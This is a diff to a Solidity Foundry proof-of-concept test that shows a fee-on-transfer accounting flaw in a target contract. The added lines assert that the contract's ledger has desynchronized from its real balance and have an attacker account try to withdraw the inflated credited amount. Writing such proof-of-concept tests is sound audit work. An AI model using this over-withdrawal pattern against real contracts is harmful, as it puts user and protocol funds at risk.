@@ -93,7 +93,12 @@ contract PoC is Test {
         uint256 actuallyReceived = mock.balanceOf(target);
         console.log("credited by target:", credited);
         console.log("actually received:", actuallyReceived);
-        // Vulnerable: credited 100, received 90. Correct: credited 90.
-        assertGt(credited, actuallyReceived, "exploit did not reproduce: target measured the real amount");
+        
+        // Assert that the ledger has desynchronized from the actual balance
+        assertGt(credited, actuallyReceived, "exploit did not reproduce: target accounting correctly handled fee-on-transfer");
+        // Prove that a withdrawal of the 'credited' amount fails (or bricks)
+        vm.prank(attackerEOA);
+        (bool withdrawOk,) = target.call(abi.encodeWithSignature("withdraw(uint256)", credited));
+        assertTrue(!withdrawOk, "exploit did not reproduce: target allowed over-withdrawal");
     }
 }
